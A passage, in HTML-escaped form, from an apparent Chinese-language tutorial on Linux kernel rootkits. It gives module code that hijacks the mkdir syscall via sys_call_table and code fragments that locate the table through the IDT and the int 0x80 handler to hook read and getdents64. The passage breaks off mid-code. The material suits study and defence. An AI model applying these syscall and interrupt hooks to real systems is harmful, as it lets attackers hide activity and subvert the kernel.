&lt;figure class=&quot;highlight c++&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;define&lt;/span&gt; MODULE&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;define&lt;/span&gt; __KERNEL__&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;linux/module.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;linux/kernel.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;asm/unistd.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;sys/syscall.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;sys/types.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;asm/fcntl.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;asm/errno.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;linux/types.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;linux/dirent.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;sys/mman.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;linux/string.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;linux/fs.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;linux/malloc.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;extern&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt;* sys_call_table[];       &lt;span class=&quot;comment&quot;&gt;/*sys_call_table is exported, so we&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                     can access it*/&lt;/span&gt;               &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; (*orig_mkdir)(&lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; *path); &lt;span class=&quot;comment&quot;&gt;/*the original systemcall*/&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;hacked_mkdir&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; *path)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; return &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;                           &lt;span class=&quot;comment&quot;&gt;/*everything is ok, but he new systemcall&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                     does nothing*/&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;init_module&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt;)&lt;/span&gt;                &lt;span class=&quot;comment&quot;&gt;/*module setup*/&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; orig_mkdir=sys_call_table[SYS_mkdir];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; sys_call_table[SYS_mkdir]=hacked_mkdir;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; return &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;cleanup_module&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt;)&lt;/span&gt;            &lt;span class=&quot;comment&quot;&gt;/*module shutdown*/&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; sys_call_table[SYS_mkdir]=orig_mkdir; &lt;span class=&quot;comment&quot;&gt;/*set mkdir syscall to the origal&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                       one*/&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;注意，要对系统调用(sys_call_table)进行替换，却必须要获取该地址后才可以进行替换。但是Linux 2.6版的内核出于安全的考虑没有将系统调用列表基地址的符号sys_call_table导出，但是我们可以采取一些hacking的方式进行获取。&lt;br&gt;因为系统调用都是通过0x80中断来进行的，故可以通过查找0x80中断的处理程序来获得sys_call_table的地址。其基本步骤是：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;获取中断描述符表(IDT)的地址(使用C ASM汇编)&lt;/li&gt;
&lt;li&gt;从中查找0x80中断(系统调用中断)的服务例程(8*0x80偏移)&lt;/li&gt;
&lt;li&gt;搜索该例程的内存空间，&lt;/li&gt;
&lt;li&gt;从其中获取sys_call_table(保存所有系统调用例程的入口地址)的地址&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;有关获取IDT表地址的代码：&lt;/p&gt;
&lt;figure class=&quot;highlight&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;unsigned long get_addr_idt (void)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         unsigned char idtr[6];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         unsigned long idt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        __asm__ volatile (&quot;sidt %0&quot;: &quot;=m&quot; (idtr));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        idt = *((unsigned long *) &amp;amp;idtr[2]);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        return(idt);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;获取syscall table地址的方法还有许多，更多可参考 &lt;a href=&quot;http://www.cnblogs.com/LittleHann/p/3854977.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Linux System Calls Hooking Method Summary&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;对于 1)类型的rootkit相当于将系统调用的hook转移到了 对80中断的hook，具体可参考 &lt;a href=&quot;http://www.cnblogs.com/LittleHann/p/3910696.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Rootkit Hacking Technology &amp;amp;&amp;amp; Defence Strategy Research&lt;/a&gt;&lt;br&gt;以及&lt;br&gt;&lt;a href=&quot;http://www.phrack.org/archives/issues/59/4.txt&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Phrack issue 59, article 0x04 (“Handling the Interrupt Descriptor Table”&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;相关代码如下：&lt;/p&gt;
&lt;figure class=&quot;highlight&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;84&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;/*&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;1. 通过&quot;中断寄存器&quot;获取中断描述符表(IDT)的地址(使用C ASM汇编)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;*/&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;asm(&quot;sidt %0&quot;:&quot;=m&quot;(idt48));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;/*&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2. 从中查找0x80中断(&quot;0x80中断&quot;就是&quot;系统调用中断&quot;)的服务例程(8*0x80偏移)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&quot;中断描述符表(IDT)&quot;中有很多项，每项8个字节，而第0x80项才是系统调用对应的中断&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;struct descriptor_idt&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        unsigned short offset_low;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        unsigned short ignore1;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        unsigned short ignore2;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        unsigned short offset_high;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;static struct &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        unsigned short limit;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        unsigned long base;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;__attribute__ ((packed)) idt48;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;*/&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;pIdt80 = (struct descriptor_idt *)(idt48.base + 8*0x80);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;system_call_addr = (pIdt80-&amp;gt;offset_high &amp;lt;&amp;lt; 16 | pIdt80-&amp;gt;offset_low);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;/*&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3. 搜索该例程的内存空间，获取&quot;系统调用函数表&quot;的地址(&quot;系统调用函数表&quot;根据系统调用号作为索引保存了linux系统下的所有系统调用的入口地址)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;*/&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;for (i=0; i&amp;lt;100; i++)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    if (p==&#39;\xff&#39; &amp;amp;&amp;amp; p[i+1]==&#39;\x14&#39; &amp;amp;&amp;amp; p[i+2]==&#39;\x85&#39;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        sys_call_table = *(unsigned int*)(p+i+3);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        printk(&quot;addr of sys_call_table: %x\n&quot;, sys_call_table);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        return ;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;/*&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4. 将sys_call_table作为基址，根据系统调用号作为索引，获取指定的系统调用的函数地址指针，因为我们通过劫持80中断进而达到系统调用劫持的目的后，还需要将代码控制流重新导向原始的系统调用&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;*/&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;orig_read = sys_call_table[__NR_read]; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;orig_getdents64 = sys_call_table[__NR_getdents64];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;..&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;replace&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;..&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;/*&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5. 直接替换IDT中的某一项，也就是我们需要通过代码模拟原本&quot;系统调用中断例程(IDT[0x80])&quot;的代码逻辑&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;*/&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;void new_idt(void)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        ASMIDType&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        (&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &quot;cmp %0, %%eax      \n&quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &quot;jae syscallmala        \n&quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &quot;jmp hook               \n&quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span 